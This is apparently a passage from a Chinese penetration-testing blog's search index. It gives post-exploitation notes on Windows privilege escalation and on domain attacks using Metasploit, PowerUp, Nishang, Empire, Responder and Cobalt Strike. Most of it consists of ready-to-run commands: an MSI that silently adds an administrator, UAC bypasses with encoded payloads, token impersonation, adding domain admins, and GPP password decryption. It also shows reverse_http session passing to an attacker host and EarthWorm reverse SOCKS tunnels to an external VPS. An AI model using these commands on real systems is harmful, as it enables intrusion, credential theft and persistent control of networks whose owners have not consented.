exploit&#x2F;windows&#x2F;local&#x2F;service_permissions#找出Windows系统中可能存在的配置错误并利用</span><br><span class="line">其中&quot;AGGRESSIVE&quot;选项：YES利用目标服务器中每一个有缺陷的服务；NO在第一次提权成功之后就会停止工作</span><br></pre></td></tr></table></figure><p>此模块在遇到不是管理员权限时，会自动使用DLL劫持已存在的服务</p></li></ul><h3 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h3><p>注册表键AlwaysInstallElevated是一个策略设置项。Windows允许低权限用户已System权限运行安装权限。若启用，任何权限都能以NT AUTHORITY\SYSTEM权限安装恶意的MSI</p><ul><li><p>PowerUp 检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;c:\PowerUp.ps1&#39;); Get-RegistryAlwaysInstallElevated</span><br><span class="line">#返回True为可用</span><br><span class="line">Write-UserAddMSI#添加一个管理员账户的msi</span><br><span class="line">msiexec &#x2F;q &#x2F;i UserAdd.msi#以普通用户运行UserAdd.msi就会创建一个管理员账户</span><br><span class="line">&#x2F;quiet #不向用户发送信息</span><br><span class="line">&#x2F;qn#不使用GUI</span><br><span class="line">&#x2F;i#安装</span><br></pre></td></tr></table></figure></li><li><p>MSF利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated#返回system权限的shell</span><br></pre></td></tr></table></figure></li></ul><h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><p>存在缺陷的服务程序利用了属于可执行文件的文件/文件夹<br>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的<br>两种可能信：1.如果路径与服务有关，就任意创建一个服务或者编译Service模板。 2. 如果路径与可执行文件有关，就任意创建一个可执行文件。<br>*对于路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Some Folders\Service.exe</span><br><span class="line">执行：</span><br><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Some.exe</span><br><span class="line">C:\Program Files\Some Folder\Service.exe</span><br></pre></td></tr></table></figure><p>当以”适当”命名的程序上传到影响目录，一旦服务重启，就会以System运行</p><ul><li><p>列出没有被引号引起来的服务列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name, displayname, pathname, startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br><span class="line">icacls &quot;路径&quot;#对列出的未被引号引起来的服务，查看其读写权限</span><br><span class="line">#参数:(M):修改(F):完全控制(CI):从属容器将继承访问控制项(OI):从属文件将继承访问控制项</span><br></pre></td></tr></table></figure></li><li><p>上传exe至相应目录</p></li><li><p>重启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure></li><li><p>MSF实战利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;trusted_service_path#该模块会将可执行程序放到受影响的文件夹中，然后将受影响的服务重启</span><br><span class="line">#对trusted_service_path进行设置,设置为漏洞路径</span><br><span class="line">#注意需要使用</span><br><span class="line">set AutoRunScript migrate -f#将其迁移至其他进程（因为服务控制管理器会认为进程出错而终止此进程）</span><br></pre></td></tr></table></figure></li></ul><h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>网络管理员配置同一个环境时，往往会使用脚本批量部署，会使用安装配置文件，而往往这些配置文件可能会包含本地管理员账号和密码等敏感信息</p><ul><li><p>查询此类信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &#x2F;b &#x2F;s c:\Unattend.xml</span><br></pre></td></tr></table></figure></li><li><p>MSF利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_unattend#自动扫描并将安装配置文件下载下来</span><br></pre></td></tr></table></figure></li></ul><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序替换掉原来的程序。等到下次计划任务执行时，就会以高权限运行恶意程序。</p><ul><li><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v#查看计划任务</span><br></pre></td></tr></table></figure></li><li><p>使用AccessChk 查看指定目录权限配置情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -dqv &quot;c:\Microsoft&quot; -accepteula</span><br></pre></td></tr></table></figure></li></ul><h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><p>SYSVOL是活动目录里存储域公共文件夹服务器副本的共享文件夹，在所有经过身份验证的域用户内共享。域策略存放在C:\Windows\SYSVOL\DoMAIN\Policies\目录中。<br>管理员会用脚本批量修改本地管理员面膜，相当于域内所有机器本地管理员密码是相同的。所以在管理新建策略后会自动在SYSVOL共享目录中生成一个XML，保存了该组策略更新后的密码，此密码可被破解(cpassword)</p><ul><li><p>手动查找cpassword</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\dc\sysvol\域名\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml#在其中找到属性为cpassword的值</span><br></pre></td></tr></table></figure><p>出了Group.xml还有Service\Services.xml,ScheduledTasks\ScheduledTasks.xml,Printers\Printers.xml,Drives\Drives.xml,DataSources\DataSources.xml</p></li><li><p>使用Python脚本进行解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gpprefdecrypt.py xxxxxxxxxxx</span><br></pre></td></tr></table></figure></li><li><p>Powershell获取cpassword</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-GPPPassword.ps1#将脚本导入系统，后获取策略组中密码</span><br><span class="line">Get-GPPPassword</span><br></pre></td></tr></table></figure></li><li><p>MSF获取cpassword</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp#此模块获取session中的策略组密码</span><br></pre></td></tr></table></figure></li></ul><h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><p>UAC要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码</p><ul><li><p>MSF中的bypass模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac#获得新shell,在执行getsystem</span><br></pre></td></tr></table></figure><p>使用bypassuac模块进行提权时，当前用户必须在管理员组中，且UAC必须为默认模式。(即”仅在程序试图改变我的计算及时通知我”)</p></li><li><p>MSF中的RunAs模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ask#此模块会穿件一个可执行文件,在目标机运行并在弹框提示用户是否继续运行时选择继续运行</span><br></pre></td></tr></table></figure><p>对于RunAs模块进行提权，用户必须在管理员组中或者是知道管理员密码需要使用<code>EXE::Custom</code>选项创建一个可执行文件（需要进行必要的免杀处理）</p></li><li><p>Nishang中的Invoke-PsUACme模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PsUACme#模块使用来自UACME项目的DLL绕过UAC</span><br><span class="line">Invoke-PsUACme -Verbose#使用Sysprep方法执行默认的payload</span><br><span class="line">Invoke-PSUACme -method oobe -Verbose#使用oobe方法执行默认的payload</span><br><span class="line">Invoke-PSUACme -method oobe -Payload &quot;powershell -windowstyle hidden -e YourEncodedPayload&quot;    #执行指定的Payload</span><br></pre></td></tr></table></figure></li><li><p>Empire中的bypassuac模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc&#x2F;bypassuac#即可获得反弹shell</span><br></pre></td></tr></table></figure></li><li><p>Empire中的bypassuac_wscript模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc&#x2F;bypassuac_wscript#此模块只适用于Windows7 暂时没有对应补丁</span><br></pre></td></tr></table></figure></li></ul><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>令牌指系统中的临时令牌，分为：1.访问令牌：控制操作主体的系统对象。2. 密保令牌：身份校验的物理设备<br>伪造令牌的核心为kerberos协议。<br>kerberos协议是一种网络认证协议，通过密钥系统为客户机/服务器应用程序提供强大的认证服务：</p><ul><li><p>MSF实战</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#在已获得的shell内</span><br><span class="line">use incognite#执行模块</span><br><span class="line">list_tokens -u#列出可获得的令牌</span><br><span class="line">#会列出两种形式的令牌：Delegation Tokens(授权令牌，支持交互式登录)；Impersonation Tokens(模拟令牌，非交互式的会话)</span><br><span class="line">#令牌数量取决于meterpreter shell访问级别</span><br><span class="line">impersonate_token xxxxxxxx\\xxxxxx   #Delegation Tokens中的信息；格式：主机名\\用户名</span><br></pre></td></tr></table></figure></li><li><p>Rotten Potato 本地提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">use incognite</span><br><span class="line">list_tokens -u</span><br><span class="line">upload &#x2F;xxxxx&#x2F;rottenpotato.exe#上传载体</span><br><span class="line">execute -HC -f rottenpotato.exe#调用载体</span><br><span class="line">impersonate_token xxxxx\\xxxxxx#将令牌注入</span><br></pre></td></tr></table></figure></li><li><p>添加域管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">ps#列出进程</span><br><span class="line">migrate#迁移到该进程</span><br><span class="line">shell#进入命令行</span><br><span class="line">net user xxxx(username) xxxx(password) &#x2F;ad &#x2F;domain#添加域用户</span><br><span class="line">net group &quot;domain admins&quot; xxxx(username) &#x2F;ad &#x2F;domain#将此用户添加到域管理员组中</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain#查看是否添加成功</span><br><span class="line">meterpreter会话</span><br><span class="line">add user xxxx(username) xxxx(password) -h 1.1.1.2    #添加域用户</span><br><span class="line">add group_user &quot;Domain Admin&quot; xxxx(username) -h 1.1.1.2 #添加到域管</span><br></pre></td></tr></table></figure><p>同时我们可以选择注入进程后获得高权限后，拉出密钥进行令牌顶替</p></li><li><p>Empire下的令牌窃取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">creds#使用内置的mimikatz工具获取密码，查看Empire列举出的密码</span><br><span class="line">pth&lt;ID&gt;#ID 为CreID，窃取令牌</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps#列出进程查看高权限进程</span><br><span class="line">steal_tokenID#偷取这个令牌</span><br><span class="line">revtoself #恢复令牌权限</span><br></pre></td></tr></table></figure></li></ul><h2 id="无凭证条件下的权限获取分析"><a href="#无凭证条件下的权限获取分析" class="headerlink" title="无凭证条件下的权限获取分析"></a>无凭证条件下的权限获取分析</h2><p>已经进入目标网络，但没有获得任何信息凭证<br>LLMNR和NetBIOS欺骗攻击<br>LLMNR是种域名系统数据报格式，当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR解析本地网段中的机器名称<br>LLMNR工作流程</p><ol><li>DNS客户端在自己的内部名称缓存中查询名称</li><li>如果没找到，主机将向主DNS发送名称查询请求</li><li>如果主DNS没有回应或者收到了错误信息，将会向备用DNS发送请求</li><li>如果备用DNS没有回应或者收到了错误的信息，将使用LLMNR进行解析</li><li>主机通过UDP协议向组播地址224.0.0.252的5355端口发送多播查询请求，以获取主机所对应的IP地址。查询范围仅限于本地子网</li><li>本地子网中所有支持LLMNR的主机在收到查询请求后，会对比自己的主机名。不同就丢弃，相同就向主机发送包含自己的IP地址的单播信息</li></ol><p>NetBIOS<br>根据NetBIOS协议广播获得计算机名称，并将其解析为相应的IP地址<br>NetBIOS提供三种服务：<br>NetBIOS-NS(名称服务)：用于名称注册和解析，已启动会话和分发数据包<br>Datagram Distribution Service(数据包分发服务)：无连接服务，负责进行错误检测和恢复<br>Session Service(会话服务):允许两台计算机建立连接，允许电子邮件跨越多个数据包进行传输<br>Net-NTLM Hash<br>指在网络环境中经过NTLM认证的散列值。<br>NTLM Hash<br>NTLM Hash 是指Windows操作系统的Security Account Manager中保存的用户密码散列值，其散列值通常保存在Windows SAM文件中或者NTDS.DIT数据库中</p><h3 id="LLMNR和NetBIOS欺骗攻击"><a href="#LLMNR和NetBIOS欺骗攻击" class="headerlink" title="LLMNR和NetBIOS欺骗攻击"></a>LLMNR和NetBIOS欺骗攻击</h3><p>工具Responder</p><ol><li>开启Responder的监听模式</li><li>利用SMB协议获取网络中计算机的Net-NTLM Hash（用户输入错误的计算机名，在DNS服务器上进行名称查询操作失败时，名称解析请求被退回，使用NBT-NS和LLMNR进行解析）</li><li>Responder，使用回应请求功能，Responder会自动回应客户端的请求并声称自己就是被输入错误的计算机名的那台机器，然后尝试建立SMB连接。客户端会发送自己的Net-NTLM Hash进行身份验证，此时将得到目标及其的Net-NTLM Hash</li></ol>]]></content>
      
      
      <categories>
          
          <category> 内网杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内网提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF与CS相互派生</title>
      <link href="2021/04/16/MSF%E4%B8%8ECS%E7%9B%B8%E4%BA%92%E6%B4%BE%E7%94%9F/"/>
      <url>2021/04/16/MSF%E4%B8%8ECS%E7%9B%B8%E4%BA%92%E6%B4%BE%E7%94%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="MSF派生至CS"><a href="#MSF派生至CS" class="headerlink" title="MSF派生至CS"></a>MSF派生至CS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">background#将meterpreter shell在后台挂起</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject#使用模块外联</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http#选用的payload一定要跟cs下监听的payload方式一样，注意32位和64位</span><br><span class="line">set DisablePayloadHandler true#禁止产生一个新的handler</span><br><span class="line">set LHOST IP#ip为cs监听会话用的ip</span><br><span class="line">set LPORT Port#端口为cs对应的接受反弹shell的端口</span><br><span class="line">set pid 进程号#设置派生给cs后木马进程的pid进程号，如果有system权限则可以指定一个具有system权限的进程，这样cs接收到会话也是最高权限，也可以不手动选择进程号</span><br><span class="line">set session 1#设置需要派送的meterpreter shell</span><br><span class="line">exploit#执行</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS</span><br><span class="line">制作一个普通http监听就可以</span><br></pre></td></tr></table></figure><h3 id="CS派生至MSF"><a href="#CS派生至MSF" class="headerlink" title="CS派生至MSF"></a>CS派生至MSF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CS:</span><br><span class="line">Payload:Foreign HTTP\HTTPS</span><br><span class="line">HOST:MSF的地址</span><br><span class="line">PORT:MSF的端口</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http\https#与CS相同</span><br><span class="line">set LHOST 本机地址</span><br><span class="line">set LPORT 本机设定ip</span><br><span class="line">exploit#启动监听</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS</span><br><span class="line">在相关要派生的会话上选择派生，派生的监听器选择刚刚创建的CS监听器</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF与CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透</title>
      <link href="2021/04/16/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>2021/04/16/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>  内网穿透实则就是在主机之间建立隧道，隧道就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。<br>  隧道的路线，就是端口映射连接再映射再连接如此反复过程</p><h2 id="EW穿透"><a href="#EW穿透" class="headerlink" title="EW穿透"></a>EW穿透</h2><h3 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssocksd#正向代理</span><br><span class="line">rcsocks,rssocks#反向代理的客户端和服务端</span><br><span class="line">lcx_slave  #该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。</span><br><span class="line">lcx_tran   #该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。</span><br><span class="line">lcx_listen #该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</span><br><span class="line">-l#监听</span><br><span class="line">-s#选择对应服务</span><br><span class="line">-d,-f#指定对应ip</span><br><span class="line">-e,-g#指定对应端口</span><br></pre></td></tr></table></figure><h3 id="案例详解"><a href="#案例详解" class="headerlink" title="案例详解"></a>案例详解</h3><h4 id="一级网络环境"><a href="#一级网络环境" class="headerlink" title="一级网络环境"></a>一级网络环境</h4><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210416162335.png"></p><ul><li><p>正向道理（有公网IP）（1）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 888#架设端口为888的socks代理</span><br></pre></td></tr></table></figure></li><li><p>反向代理（无公网IP）（2）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vps</span><br><span class="line">ew -s rcsocks -l 1008 -e 888#VPS转接隧道,将1008端口收到的代理请求转发至888</span><br><span class="line">web</span><br><span class="line">ew -s rssocks -d 139.*.*113 -e 888#在10.48.128.25服务器上启动socks5服务，然后反弹到139.*.*.113的VPS上的888端口</span><br></pre></td></tr></table></figure><h4 id="二级网络环境（A）"><a href="#二级网络环境（A）" class="headerlink" title="二级网络环境（A）"></a>二级网络环境（A）</h4><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210416162514.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B主机</span><br><span class="line">ew -s ssocksd -l 888#利用ssocksd方式启动888端口的socks代理</span><br><span class="line">A主机</span><br><span class="line">ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888#将1080端口收到的请求转发给B主机的888端口</span><br><span class="line">#访问A主机外网的1080端口使用B主机的socks代理</span><br></pre></td></tr></table></figure><h4 id="二级网络环境（B）"><a href="#二级网络环境（B）" class="headerlink" title="二级网络环境（B）"></a>二级网络环境（B）</h4><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210416162619.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VPS</span><br><span class="line">ew -s lcx_listen -l 10800 -e 888#添加转接通道，将10800端口收到的代理请求转发给888</span><br><span class="line">B主机</span><br><span class="line">ew -s ssocksd -l 999#启动本机999的端口socks代理服务</span><br><span class="line">A主机</span><br><span class="line">ew -s lcx_slave -d 139.*.*.113 -e 888 -f 10.48.128.49 -g 999#在A主机利用lcx_slave方式，将公用VPS的888端口和B主机999端口相互连接起来</span><br></pre></td></tr></table></figure><p>通过访问公网VPS（139.<em>.</em>.113）的10800端口使用在主机B上架设的socks5代理</p><h4 id="三级网络环境"><a href="#三级网络环境" class="headerlink" title="三级网络环境"></a>三级网络环境</h4><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210416162728.png"></p><h2 id="本地Proxy配置"><a href="#本地Proxy配置" class="headerlink" title="本地Proxy配置"></a>本地Proxy配置</h2><h3 id="proxychain"><a href="#proxychain" class="headerlink" title="proxychain"></a>proxychain</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">#解除dynamic_chain的注释</span><br><span class="line">#[ProxyList]下面增加socks代理</span><br><span class="line">proxychain4 curl xxxxxx #测试能否工作</span><br></pre></td></tr></table></figure><h3 id="命令行输入"><a href="#命令行输入" class="headerlink" title="命令行输入"></a>命令行输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 </span><br><span class="line">export http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 </span><br><span class="line">export all_proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:7890</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
